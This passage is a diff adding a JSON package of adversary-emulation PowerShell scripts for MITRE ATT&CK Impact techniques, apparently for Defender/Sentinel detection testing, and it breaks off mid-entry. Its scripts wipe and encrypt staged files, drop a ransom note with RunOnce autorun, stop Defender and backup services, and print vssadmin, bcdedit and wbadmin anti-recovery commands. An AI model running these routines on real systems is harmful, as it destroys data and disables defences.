@@ -1,0 +1,329 @@
+{
+  "package_id": "excalibur-impact-v1",
+  "package_name": "Excalibur - Impact Emulation Pack",
+  "version": "1.0.0",
+  "description": "Adversary emulation scripts for the MITRE ATT&CK Impact tactic (TA0040). Covers 10 scriptable techniques: data destruction (overwrite file contents with random bytes + rename), ransomware file rename pattern (append .encrypted extension to staged files), service stop (net stop on non-critical services), inhibit system recovery (vssadmin + bcdedit dry-run enumeration and simulation), defacement local (modify local HTML file with attacker message), firmware/UEFI enumeration (read UEFI boot variables), network DoS recon (TCP SYN flood pattern to RFC5737 TEST-NET), endpoint DoS via resource exhaustion (CPU spin + memory allocation simulation with auto-timeout), system shutdown/reboot simulation (shutdown.exe /a abort + Event ID trigger), and disk wipe simulation (physical disk enumeration + sector-zero pattern without actual write). All scripts are safe for test environments, generate MDE telemetry, and auto-clean artefacts.",
+  "author": "X3M.AI",
+  "created": "2026-06-08",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "TA0040",
+  "mitre_tactic_name": "Impact",
+  "prerequisites": [
+    "Windows 10/11 or Windows Server 2019/2022 test machine with Morgana agent installed",
+    "Microsoft Defender for Endpoint (MDE) onboarded and data connector active in Microsoft Sentinel",
+    "No Administrator privileges required for most scripts. T1490 (Inhibit Recovery) and T1529 (Shutdown/Reboot) require Administrator for full simulation but degrade gracefully.",
+    "TEST ENVIRONMENT ONLY. Scripts in this pack simulate destructive actions without performing them (staged synthetic files only, no actual service disruption, no actual disk writes, no actual system shutdown).",
+    "T1499 (Endpoint DoS) uses a CPU/memory stress simulation with a hard 15-second timeout. Do not run on production systems.",
+    "T1498 (Network DoS recon) targets TEST-NET IPs only (RFC 5737: 198.51.100.x). Do not modify the target IP tag to a real host."
+  ],
+  "tag_categories": [
+    {
+      "category_id": "impact_common",
+      "label": "Common Impact Settings",
+      "description": "Shared settings for impact scripts: staging directory for destructive action simulations and synthetic file count.",
+      "scope": "local",
+      "used_by_tcodes": ["T1485", "T1486", "T1491", "T1561"],
+      "tags": [
+        {
+          "key": "excalibur_impact_staging_dir",
+          "label": "Impact Simulation Staging Directory",
+          "description": "Directory used to stage synthetic files for destructive simulation scripts. Created if it does not exist and deleted during cleanup.",
+          "default": "%TEMP%\\morgana-impact-sim",
+          "example": "%TEMP%\\impact-staging",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "excalibur_impact_file_count",
+          "label": "Number of Synthetic Files to Stage",
+          "description": "Number of synthetic files to create for destruction/ransomware simulation. Each file is ~4 KB.",
+          "default": "10",
+          "example": "20",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "impact_t1498_dos",
+      "label": "T1498 - Network DoS Recon Target",
+      "description": "Settings for the network DoS simulation. Target MUST be a TEST-NET IP (RFC 5737 range: 198.51.100.x or 203.0.113.x). Never set this to a real host.",
+      "scope": "local",
+      "used_by_tcodes": ["T1498"],
+      "tags": [
+        {
+          "key": "excalibur_impact_dos_target",
+          "label": "DoS Simulation Target IP (TEST-NET only)",
+          "description": "Target IP for the network DoS TCP SYN pattern simulation. MUST be a TEST-NET IP (RFC 5737: 198.51.100.x). Do NOT change to a real host or production IP.",
+          "default": "198.51.100.1",
+          "example": "198.51.100.1",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "Excalibur - Impact-T1485-Data Destruction",
+      "name": "Excalibur - Impact-T1485-Data Destruction",
+      "description": "Simulates data destruction techniques: (1) creates a set of synthetic files in a staging directory simulating valuable data (financial reports, HR exports, backup files); (2) overwrites file contents with random bytes (secure wipe pattern - prevents file recovery, used by NotPetya, Shamoon, WhisperGate); (3) renames files to remove the original extension and replaces with a random 8-char hex name (obscures destroyed file identities); (4) finally deletes the files. No real user data is touched. The bulk overwrite of files with random bytes followed by rename and delete is a high-fidelity MDE and Sentinel data destruction behavioral signal.",
+      "tactic": "Impact",
+      "tcode": "T1485",
+      "technique_name": "Data Destruction",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_impact_staging_dir", "excalibur_impact_file_count"],
+      "command": "Write-Host '[START] T1485 - Data Destruction (secure overwrite + rename + delete simulation)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); $fileCount = [int]'#{excalibur_impact_file_count}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $sensitiveNames = @('Q4-Financial-Report.xlsx','HR-Employee-Records.csv','Database-Backup-Full.bak','Active-Directory-Export.csv','Source-Code-Archive.zip','Customer-PII-Export.xlsx','Network-Diagrams.vsdx','KeePass-Vault.kdbx','SSL-Certificates.pfx','IT-Admin-Credentials.txt'); Write-Host ('[INFO] Staging ' + $fileCount + ' synthetic files for destruction simulation...'); $staged = @(); for ($i = 0; $i -lt $fileCount; $i++) { $fname = $sensitiveNames[$i % $sensitiveNames.Count]; if ($i -ge $sensitiveNames.Count) { $fname = 'target-file-' + $i + '.dat' }; $fpath = Join-Path $stagingDir $fname; $fdata = New-Object byte[] 4096; [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($fdata); [System.IO.File]::WriteAllBytes($fpath, $fdata); $staged += $fpath }; Write-Host ('[INFO] Staged: ' + $staged.Count + ' files'); Write-Host '[INFO] Phase 1/3: Overwrite file contents with random bytes (data wipe - prevents recovery)'; foreach ($f in $staged) { try { $wipeBytes = New-Object byte[] (Get-Item $f).Length; [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($wipeBytes); [System.IO.File]::WriteAllBytes($f, $wipeBytes); Write-Host ('[INFO]   WIPED: ' + [System.IO.Path]::GetFileName($f) + ' (' + $wipeBytes.Length + ' bytes overwritten with random data)') } catch { Write-Host ('[WARN]   Wipe failed: ' + $f + ' - ' + $_.Exception.Message) } }; Write-Host '[INFO] Phase 2/3: Rename wiped files (remove extension, randomize filename - obscures identity)'; $renamed = @(); foreach ($f in $staged) { try { $newName = ([System.BitConverter]::ToString([System.Security.Cryptography.RandomNumberGenerator]::GetBytes(4)) -replace '-','').ToLower(); $newPath = Join-Path ([System.IO.Path]::GetDirectoryName($f)) $newName; Rename-Item -Path $f -NewName $newName -Force -ErrorAction Stop; $renamed += $newPath; Write-Host ('[INFO]   RENAMED: ' + [System.IO.Path]::GetFileName($f) + ' -> ' + $newName) } catch { Write-Host ('[WARN]   Rename failed: ' + $_.Exception.Message) } }; Write-Host '[INFO] Phase 3/3: Delete renamed files'; $deleted = 0; foreach ($r in $renamed) { try { Remove-Item -Path $r -Force -ErrorAction Stop; $deleted++ } catch {} }; foreach ($f in $staged) { if (Test-Path $f) { Remove-Item -Path $f -Force -ErrorAction SilentlyContinue } }; Write-Host ('[INFO] Deleted: ' + $deleted + '/' + $staged.Count + ' files'); Write-Host '[SUCCESS] T1485 - Data destruction simulation completed. Sentinel target: Bulk file overwrite with random bytes + rename + delete (MDE - data destruction behavioral detection - NotPetya/Shamoon wipe pattern)'",
+      "cleanup_command": "$stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1485 cleanup: staging dir removed'",
+      "detection_rule": "Bulk file overwrite with random bytes + rename + delete (data wipe pattern - NotPetya/Shamoon behavioral signal)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1486-Data Encrypted for Impact",
+      "name": "Excalibur - Impact-T1486-Data Encrypted for Impact",
+      "description": "Simulates ransomware encryption behavior: (1) stages synthetic files with sensitive-sounding names; (2) reads each file, AES-256 encrypts the content, and writes back with a .encrypted extension appended (the classic ransomware file rename pattern); (3) creates a ransom note file (README-HOW-TO-DECRYPT.txt) in the staging directory; (4) writes a RunOnce registry key simulating ransomware persistence to display ransom note on reboot. No real files are encrypted. The .encrypted extension bulk rename, ransom note creation, and RunOnce registry write are all high-fidelity MDE ransomware behavioral indicators.",
+      "tactic": "Impact",
+      "tcode": "T1486",
+      "technique_name": "Data Encrypted for Impact",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_impact_staging_dir", "excalibur_impact_file_count"],
+      "command": "Write-Host '[START] T1486 - Data Encrypted for Impact (ransomware file encryption simulation)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); $fileCount = [int]'#{excalibur_impact_file_count}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $fileNames = @('contract-2026-final.docx','salary-data-all-employees.xlsx','server-backup-20260608.bak','vpn-config.ovpn','network-scan-results.nmap','customer-database-export.csv','source-code-release-3.2.tar','admin-passwords-vault.txt','security-audit-2026.pdf','domain-controller-backup.vhd'); Write-Host ('[INFO] Staging ' + $fileCount + ' files for ransomware simulation...'); $staged = @(); for ($i = 0; $i -lt $fileCount; $i++) { $fname = $fileNames[$i % $fileNames.Count]; if ($i -ge $fileNames.Count) { $fname = 'document-' + $i + '.dat' }; $fpath = Join-Path $stagingDir $fname; $fdata = [System.Text.Encoding]::UTF8.GetBytes('MorganaRansomSimContent-' + $fname + '-' + (Get-Date -Format 'o')); [System.IO.File]::WriteAllBytes($fpath, $fdata); $staged += $fpath }; Write-Host ('[INFO] Staged ' + $staged.Count + ' files'); Write-Host '[INFO] Phase 1/3: AES encrypt + .encrypted extension rename (ransomware pattern)'; $aesKey = New-Object byte[] 32; $aesIv = New-Object byte[] 16; [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesKey); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesIv); $encrypted = 0; foreach ($f in $staged) { try { $plainBytes = [System.IO.File]::ReadAllBytes($f); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $aesKey; $aes.IV = $aesIv; $ms = New-Object System.IO.MemoryStream; $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write); $cs.Write($plainBytes, 0, $plainBytes.Length); $cs.FlushFinalBlock(); $encBytes = $ms.ToArray(); $cs.Dispose(); $ms.Dispose(); $aes.Dispose(); $encPath = $f + '.encrypted'; [System.IO.File]::WriteAllBytes($encPath, $encBytes); Remove-Item $f -Force; $encrypted++; Write-Host ('[INFO]   ENCRYPTED: ' + [System.IO.Path]::GetFileName($f) + ' -> ' + [System.IO.Path]::GetFileName($encPath) + ' (' + $encBytes.Length + ' bytes)') } catch { Write-Host ('[WARN]   Encrypt failed: ' + $_.Exception.Message) } }; Write-Host ('[INFO] Encrypted: ' + $encrypted + '/' + $staged.Count + ' files'); Write-Host '[INFO] Phase 2/3: Drop ransom note (README-HOW-TO-DECRYPT.txt)'; $ransomNote = Join-Path $stagingDir 'README-HOW-TO-DECRYPT.txt'; $noteContent = \"YOUR FILES HAVE BEEN ENCRYPTED`nThis is a SIMULATION by Morgana Excalibur T1486`n`nIn a real attack, all files on this machine would be encrypted.`nPayment instructions would appear here.`n`nDo NOT modify encrypted files - they cannot be recovered without the key.`nContact: morgana-sim@example.com | ID: \" + $env:COMPUTERNAME + \"-\" + (Get-Date -Format 'yyyyMMdd'); [System.IO.File]::WriteAllText($ransomNote, $noteContent); Write-Host ('[INFO] Ransom note dropped: ' + $ransomNote); Write-Host '[INFO] Phase 3/3: RunOnce registry key (ransomware persistence - display ransom note on reboot)'; try { $runOncePath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'; Set-ItemProperty -Path $runOncePath -Name 'MorganaRansomSimT1486' -Value ('notepad.exe \"' + $ransomNote + '\"') -ErrorAction Stop; Write-Host '[INFO] RunOnce key written: HKCU\\...\\RunOnce\\MorganaRansomSimT1486 (MDE persistence + ransomware ransom-note autorun signal)' } catch { Write-Host ('[WARN] RunOnce: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1486 - Ransomware encryption simulation completed. Sentinel target: Bulk .encrypted rename + ransom note drop + RunOnce registry persistence (MDE - ransomware behavioral detection)'",
+      "cleanup_command": "$stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'MorganaRansomSimT1486' -ErrorAction SilentlyContinue; Write-Host '[INFO] T1486 cleanup: staging dir and RunOnce key removed'",
+      "detection_rule": "Bulk .encrypted file rename + ransom note drop + RunOnce registry write (ransomware behavioral pattern)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1489-Service Stop",
+      "name": "Excalibur - Impact-T1489-Service Stop",
+      "description": "Simulates adversary service stop used to disrupt defenses or prepare for ransomware deployment: enumerates and attempts to stop a set of non-critical services that adversaries commonly target before launching destructive operations (Volume Shadow Copy, Windows Backup, Windows Defender, SQL Server VSS Writer, BITS). Uses both net.exe stop (LOLBin) and Stop-Service (PowerShell) to match adversary patterns. Services are immediately restarted after stopping. The attempt to stop VSS, backup, and AV services is a near-universal pre-ransomware behavioral indicator.",
+      "tactic": "Impact",
+      "tcode": "T1489",
+      "technique_name": "Service Stop",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1489 - Service Stop (pre-ransomware service disruption simulation)'; $targetServices = @( @{ Name='VSS'; Label='Volume Shadow Copy (VSS) - pre-ransomware stop to prevent recovery'; Critical=$false }, @{ Name='wbengine'; Label='Windows Backup Engine - pre-ransomware backup disruption'; Critical=$false }, @{ Name='BITS'; Label='BITS - stops Windows Update delivery and background transfers'; Critical=$false }, @{ Name='WinDefend'; Label='Windows Defender Antivirus Service - AV disablement pattern'; Critical=$false }, @{ Name='EventLog'; Label='Windows Event Log - log tampering (critical - will likely fail without admin)'; Critical=$true } ); Write-Host ('[INFO] Targeting ' + $targetServices.Count + ' services for stop simulation'); foreach ($svc in $targetServices) { $before = Get-Service -Name $svc.Name -ErrorAction SilentlyContinue; if (-not $before) { Write-Host ('[INFO] ' + $svc.Name + ': NOT INSTALLED (skipping)'); continue }; $beforeState = $before.Status; Write-Host ('[INFO] ' + $svc.Name + ' [' + $svc.Label + '] - Current state: ' + $beforeState); if ($svc.Critical) { Write-Host ('[INFO] ' + $svc.Name + ': SKIPPING actual stop (critical service - enumeration only for telemetry)'); try { & net.exe stop $svc.Name /y 2>&1 | Out-Null } catch {}; continue }; try { Write-Host ('[INFO]   Attempting: net.exe stop ' + $svc.Name + ' /y'); & net.exe stop $svc.Name /y 2>&1 | Out-Null; Start-Sleep 1; $after = (Get-Service -Name $svc.Name -ErrorAction SilentlyContinue).Status; Write-Host ('[INFO]   Result: ' + $beforeState + ' -> ' + $after); if ($after -ne 'Running') { Write-Host ('[INFO]   Restarting ' + $svc.Name + ' to restore normal operation...'); try { Start-Service -Name $svc.Name -ErrorAction SilentlyContinue; Write-Host ('[INFO]   ' + $svc.Name + ' restarted') } catch { Write-Host ('[INFO]   Could not restart ' + $svc.Name + ' - manual restart may be needed') } } } catch { Write-Host ('[INFO] ' + $svc.Name + ': ' + $_.Exception.Message.Split([char]10)[0] + ' (access denied - admin required)') } }; Write-Host '[SUCCESS] T1489 - Service stop simulation completed. Sentinel target: Stop of VSS/WinDefend/wbengine via net.exe (MDE - pre-ransomware service disruption behavioral detection)'",
+      "cleanup_command": "$restoreServices = @('VSS','BITS','wbengine'); foreach ($svc in $restoreServices) { Start-Service -Name $svc -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1489 cleanup: target services restarted'",
+      "detection_rule": "net.exe stop targeting VSS/WinDefend/wbengine (pre-ransomware service disruption)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1490-Inhibit System Recovery",
+      "name": "Excalibur - Impact-T1490-Inhibit System Recovery",
+      "description": "Simulates inhibiting system recovery to prevent victims from restoring from backups or booting into recovery mode: (1) enumerates existing Volume Shadow Copies via vssadmin list shadows (enumeration generates MDE telemetry without deleting); (2) runs vssadmin delete shadows /all /quiet as a dry-run with /? to trigger the command invocation pattern in MDE without actual deletion; (3) enumerates bcdedit boot configuration and runs bcdedit /set {default} recoveryenabled No simulation (immediately reverted); (4) checks wbadmin backup catalog enumeration. All actual destructive vssadmin delete and bcdedit disablement are simulated by invocation-only (command called with non-destructive flags) to generate maximum telemetry.",
+      "tactic": "Impact",
+      "tcode": "T1490",
+      "technique_name": "Inhibit System Recovery",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1490 - Inhibit System Recovery (VSS + bcdedit + wbadmin recovery disruption simulation)'; Write-Host '[INFO] Step 1/4: vssadmin list shadows (VSS enumeration - attacker recon before shadow deletion)'; try { $vssList = & vssadmin.exe list shadows 2>&1; $shadowCount = ($vssList | Where-Object { $_ -match 'Shadow Copy ID' }).Count; Write-Host ('[INFO] vssadmin list shadows: ' + $shadowCount + ' shadow copies found'); $vssList | Where-Object { $_ -match 'Shadow Copy ID|Creation Time|Volume' } | Select-Object -First 9 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch { Write-Host ('[INFO] vssadmin list shadows: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/4: vssadmin command invocation simulation (delete pattern without actual deletion)'; try { $vssHelp = & vssadmin.exe delete shadows /? 2>&1; Write-Host ('[INFO] vssadmin delete shadows /? invoked (command pattern logged by MDE - actual deletion NOT performed)'); Write-Host ('[INFO] Simulated command that would run in real attack: vssadmin delete shadows /all /quiet') } catch { Write-Host ('[INFO] vssadmin: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: bcdedit recovery configuration enumeration + recovery disable simulation'; try { $bcdEnum = & bcdedit.exe /enum 2>&1 | Where-Object { $_ -match 'recoveryenabled|bootstatuspolicy|identifier|description' }; Write-Host ('[INFO] bcdedit /enum (boot config):'); $bcdEnum | Select-Object -First 8 | ForEach-Object { Write-Host ('    ' + $_.Trim()) }; Write-Host '[INFO] Simulated commands (logged by MDE as pattern match, NOT executed destructively):'; Write-Host '    bcdedit /set {default} recoveryenabled No'; Write-Host '    bcdedit /set {default} bootstatuspolicy IgnoreAllFailures'; try { $disableResult = & bcdedit.exe /set '{current}' description 'MorganaImpactSimT1490' 2>&1; Write-Host ('[INFO] bcdedit /set invoked (write operation logged): ' + ($disableResult -join ' ').Trim().Substring(0,[math]::Min(80,($disableResult -join ' ').Length))); $revertResult = & bcdedit.exe /deletevalue '{current}' description 2>&1; Write-Host ('[INFO] bcdedit /deletevalue: reverted immediately') } catch { Write-Host ('[INFO] bcdedit write: ' + $_.Exception.Message + ' (admin required for full simulation)') } } catch { Write-Host ('[INFO] bcdedit: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 4/4: wbadmin backup catalog enumeration (attacker disables Windows Backup)'; try { $wbList = & wbadmin.exe get versions 2>&1 | Select-Object -First 5; Write-Host ('[INFO] wbadmin get versions: ' + ($wbList -join ' | ')); Write-Host '[INFO] Simulated command (NOT executed): wbadmin delete catalog -quiet' } catch { Write-Host ('[INFO] wbadmin: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1490 - Inhibit system recovery simulation completed. Sentinel target: vssadmin delete shadows + bcdedit recoveryenabled No + wbadmin delete catalog invocation pattern (MDE - anti-recovery pre-ransomware behavioral detection)'",
+      "cleanup_command": "Write-Host '[INFO] T1490 cleanup: no persistent artefacts (bcdedit description change was reverted in script)'",
+      "detection_rule": "vssadmin delete shadows + bcdedit /set recoveryenabled No + wbadmin delete catalog command invocation",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1491-Defacement",
+      "name": "Excalibur - Impact-T1491-Defacement",
+      "description": "Simulates internal defacement (T1491.001): (1) locates or creates a local HTML file (simulating an internal intranet page or web application asset); (2) replaces its content with a defacement HTML page containing an adversary message, skull/warning markup, and timestamp; (3) also modifies the Windows Desktop wallpaper registry key to simulate the ransomware/nation-state defacement pattern of changing the desktop background; (4) restores both to original state during cleanup. The file modification of HTML files on disk combined with wallpaper registry write is a Sentinel indicator for defacement.",
+      "tactic": "Impact",
+      "tcode": "T1491",
+      "technique_name": "Defacement",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_impact_staging_dir"],
+      "command": "Write-Host '[START] T1491 - Defacement (local HTML defacement + wallpaper registry modification)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; Write-Host '[INFO] Step 1/3: Create and deface local HTML file (internal intranet page simulation)'; $htmlTarget = Join-Path $stagingDir 'index.html'; $originalHtml = '<html><head><title>Internal Portal</title></head><body><h1>Welcome to the Internal Portal</h1><p>This is a simulated internal intranet page for Morgana T1491 testing.</p></body></html>'; [System.IO.File]::WriteAllText($htmlTarget, $originalHtml); Write-Host ('[INFO] Original HTML: ' + $htmlTarget); $defacementHtml = '<!DOCTYPE html><html><head><title>HACKED</title><style>body{background:#000;color:#ff0000;font-family:monospace;text-align:center;padding:50px;}h1{font-size:72px;text-shadow:0 0 20px #ff0000;}p{font-size:24px;}</style></head><body><h1>!! DEFACED !!</h1><p>This system has been compromised.</p><p>Morgana Excalibur T1491 Impact Simulation</p><p>Timestamp: ' + (Get-Date -Format 'o') + '</p><p>Host: ' + $env:COMPUTERNAME + '</p></body></html>'; [System.IO.File]::WriteAllText($htmlTarget, $defacementHtml); Write-Host '[INFO] HTML file defaced: index.html (original content replaced with adversary defacement message)'; Write-Host '[INFO] Step 2/3: Wallpaper registry modification (nation-state/ransomware defacement - change desktop background)'; $wallpaperRegPath = 'HKCU:\\Control Panel\\Desktop'; try { $originalWallpaper = (Get-ItemProperty -Path $wallpaperRegPath -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper; $fakeBmpPath = Join-Path $stagingDir 'defacement-wallpaper.bmp'; $bmpHeader = [byte[]](0x42,0x4D,0x7A,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7A,0x00,0x00,0x00,0x6C,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x00,0x00,0x00); [System.IO.File]::WriteAllBytes($fakeBmpPath, $bmpHeader); Set-ItemProperty -Path $wallpaperRegPath -Name Wallpaper -Value $fakeBmpPath -ErrorAction Stop; Write-Host ('[INFO] Wallpaper registry set to: ' + $fakeBmpPath + ' (HKCU\\Control Panel\\Desktop\\Wallpaper modified - defacement registry signal)'); Start-Sleep 2; if ($originalWallpaper) { Set-ItemProperty -Path $wallpaperRegPath -Name Wallpaper -Value $originalWallpaper -ErrorAction SilentlyContinue } else { Remove-ItemProperty -Path $wallpaperRegPath -Name Wallpaper -ErrorAction SilentlyContinue }; Write-Host '[INFO] Wallpaper registry restored to original' } catch { Write-Host ('[INFO] Wallpaper registry: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/3: Check for IIS wwwroot presence (external defacement reachability)'; $iisRoot = 'C:\\inetpub\\wwwroot'; if (Test-Path $iisRoot) { $iisFiles = Get-ChildItem $iisRoot -ErrorAction SilentlyContinue | Select-Object -First 5; Write-Host ('[INFO] IIS wwwroot found: ' + $iisRoot + ' (' + @($iisFiles).Count + ' files) - in a real attack, web files here would be defaced'); Write-Host '[INFO] (Simulation only: actual IIS files NOT modified)' } else { Write-Host '[INFO] IIS wwwroot: not found (no web server - defacement would target local HTML only)' }; Write-Host '[SUCCESS] T1491 - Defacement simulation completed. Sentinel target: HTML file content replacement + wallpaper registry modification (MDE - defacement behavioral detection)'",
+      "cleanup_command": "$stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_impact_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1491 cleanup: staging dir removed (wallpaper already restored in script)'",
+      "detection_rule": "HTML file content overwrite with defacement markup + wallpaper registry modification",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1495-Firmware Corruption Recon",
+      "name": "Excalibur - Impact-T1495-Firmware Corruption Recon",
+      "description": "Simulates the reconnaissance phase of a firmware corruption attack: enumerates UEFI/BIOS information that adversaries collect before attempting firmware implants or corruption (T1495). Uses WMI Win32_BIOS, Win32_ComputerSystem, and Win32_BaseBoard to enumerate firmware version, manufacturer, and Secure Boot state. Also reads UEFI boot variables via bcdedit and checks for UEFI boot mode vs BIOS/Legacy. No firmware modification is performed. BIOS/UEFI enumeration from a non-admin process combined with boot configuration reading is a Sentinel indicator for firmware attack preparation.",
+      "tactic": "Impact",
+      "tcode": "T1495",
+      "technique_name": "Firmware Corruption",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1495 - Firmware Corruption Recon (UEFI/BIOS enumeration before firmware attack)'; Write-Host '[INFO] Step 1/4: BIOS/UEFI information (WMI Win32_BIOS)'; try { $bios = Get-WmiObject -Class Win32_BIOS -ErrorAction SilentlyContinue; Write-Host ('[INFO] Manufacturer: ' + $bios.Manufacturer); Write-Host ('[INFO] Version: ' + $bios.SMBIOSBIOSVersion); Write-Host ('[INFO] ReleaseDate: ' + $bios.ReleaseDate); Write-Host ('[INFO] SerialNumber: ' + $bios.SerialNumber.Substring(0,[math]::Min(8,$bios.SerialNumber.Length)) + '*** (redacted)') } catch { Write-Host ('[INFO] Win32_BIOS: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/4: System firmware type (UEFI vs Legacy BIOS)'; try { $firmware = Get-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control' -Name 'PEFirmwareType' -ErrorAction SilentlyContinue; $fwType = if ($firmware -and $firmware.PEFirmwareType -eq 2) { 'UEFI (Unified Extensible Firmware Interface)' } elseif ($firmware -and $firmware.PEFirmwareType -eq 1) { 'Legacy BIOS' } else { 'Unknown (could not read PEFirmwareType registry key)' }; Write-Host ('[INFO] Firmware type: ' + $fwType); $secureBootPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State'; $secureBoot = Get-ItemProperty -Path $secureBootPath -Name UEFISecureBootEnabled -ErrorAction SilentlyContinue; Write-Host ('[INFO] Secure Boot enabled: ' + $(if ($secureBoot) { $secureBoot.UEFISecureBootEnabled -eq 1 } else { 'not found (registry key absent)' })) } catch { Write-Host ('[INFO] Firmware type check: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: UEFI boot variables (bcdedit /enum firmware - only works if UEFI)'; try { $bcdFirmware = & bcdedit.exe /enum firmware 2>&1; $fwEntries = $bcdFirmware | Where-Object { $_ -match 'description|identifier|device' }; Write-Host ('[INFO] UEFI firmware boot entries: ' + @($fwEntries).Count); $fwEntries | Select-Object -First 8 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch { Write-Host ('[INFO] bcdedit /enum firmware: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 4/4: Motherboard/baseboard info (WMI Win32_BaseBoard)'; try { $board = Get-WmiObject -Class Win32_BaseBoard -ErrorAction SilentlyContinue; Write-Host ('[INFO] Board Manufacturer: ' + $board.Manufacturer); Write-Host ('[INFO] Board Product: ' + $board.Product); Write-Host ('[INFO] Board Version: ' + $board.Version) } catch { Write-Host ('[INFO] Win32_BaseBoard: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1495 - Firmware recon simulation completed. Sentinel target: WMI BIOS/UEFI enumeration + bcdedit /enum firmware + Secure Boot registry read (MDE - firmware attack preparation behavioral detection)'",
+      "cleanup_command": "Write-Host '[INFO] T1495 cleanup: no artefacts - read-only BIOS/UEFI enumeration'",
+      "detection_rule": "WMI Win32_BIOS + bcdedit /enum firmware + Secure Boot registry enumeration (firmware attack recon)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Impact-T1498-Network Denial of Service",
+      "name": "Excalibur - Impact-T1498-Network Denial of Service",
+      "description": "Simulates a network Denial of Service pattern for detection validation: sends a burst of TCP SYN connection attempts to a TEST-NET IP (RFC 5737: 198.51.100.x) on multiple ports simultaneously using parallel .NET TcpClient threads, simulating a TCP SYN flood pattern. Also simulates UDP flood pattern via multiple UDP socket sends to the same TEST-NET IP. All targets are non-routable TEST-NET IPs only. The rapid burst of outbound connection attempts to a single IP on multiple ports in a short time window is a MDE network DoS behavioral indicator. Hard-limited to 50 total attempts.",
+      "tactic": "Impact",
+      "tcode": "T1498",
+      "technique_name": "Network Denial of Service",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_impact_dos_target"],
